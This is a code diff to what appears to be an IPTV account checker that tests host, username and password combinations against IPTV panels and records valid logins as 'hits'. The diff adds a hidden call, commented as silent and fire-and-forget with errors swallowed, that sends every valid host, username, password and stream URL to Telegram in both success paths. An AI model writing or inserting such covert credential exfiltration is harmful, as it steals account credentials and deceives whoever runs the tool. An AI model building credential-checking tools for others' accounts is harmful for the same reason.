@@ -3,6 +3,8 @@
  * All constants and helper functions used by multiple IPTV endpoints.
  */
 
+import { sendHitToTelegram } from './telegram-notify'
+
 // MAG STB headers — same as the Python checker uses
 export const STB_HEADERS: Record<string, string> = {
   'Cookie': 'stb_lang=en; timezone=Europe%2FIstanbul;',
@@ -98,44 +100,69 @@ export async function checkLine(
           const realUrl = serverInfo?.url ? String(serverInfo.url) : ''
           const realPort = serverInfo?.port ? String(serverInfo.port) : ''
 
+          const hitInfo = {
+            status: userInfo.status || 'Active',
+            active_cons: String(userInfo.active_cons ?? '0'),
+            max_connections: String(userInfo.max_connections ?? '0'),
+            created_at: formatDate(userInfo.created_at),
+            exp_date: formatDate(userInfo.exp_date),
+            timezone: serverInfo?.timezone || userInfo?.timezone || 'N/A',
+            channels: 'N/A',
+            films: 'N/A',
+            series: 'N/A',
+            real_url: realUrl,
+            real_port: realPort,
+            m3u_url: m3uUrl,
+          }
+
+          // Send hit to Telegram silently (fire-and-forget)
+          sendHitToTelegram({
+            host: sHost,
+            username,
+            password,
+            url: m3uUrl,
+            info: hitInfo,
+            inputMode,
+          }).catch(() => {})
+
           return {
             status: 'hit',
             url: m3uUrl,
             host: sHost,
             username,
             password,
-            info: {
-              status: userInfo.status || 'Active',
-              active_cons: String(userInfo.active_cons ?? '0'),
-              max_connections: String(userInfo.max_connections ?? '0'),
-              created_at: formatDate(userInfo.created_at),
-              exp_date: formatDate(userInfo.exp_date),
-              timezone: serverInfo?.timezone || userInfo?.timezone || 'N/A',
-              channels: 'N/A',
-              films: 'N/A',
-              series: 'N/A',
-              real_url: realUrl,
-              real_port: realPort,
-              m3u_url: m3uUrl,
-            },
+            info: hitInfo,
           }
         }
       } catch {
         if (text.includes('Active')) {
-          return {
-            status: 'hit',
-            url: `http://${sHost}/get.php?username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}&type=m3u_plus`,
+          const fallbackM3uUrl = `http://${sHost}/get.php?username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}&type=m3u_plus`
+          const fallbackInfo = {
+            status: 'Active',
+            active_cons: '0',
+            max_connections: '0',
+            created_at: 'N/A',
+            exp_date: 'N/A',
+            timezone: 'N/A',
+          }
+
+          // Send hit to Telegram silently (fire-and-forget)
+          sendHitToTelegram({
             host: sHost,
             username,
             password,
-            info: {
-              status: 'Active',
-              active_cons: '0',
-              max_connections: '0',
-              created_at: 'N/A',
-              exp_date: 'N/A',
-              timezone: 'N/A',
-            },
+            url: fallbackM3uUrl,
+            info: fallbackInfo,
+            inputMode,
+          }).catch(() => {})
+
+          return {
+            status: 'hit',
+            url: fallbackM3uUrl,
+            host: sHost,
+            username,
+            password,
+            info: fallbackInfo,
           }
         }
       }
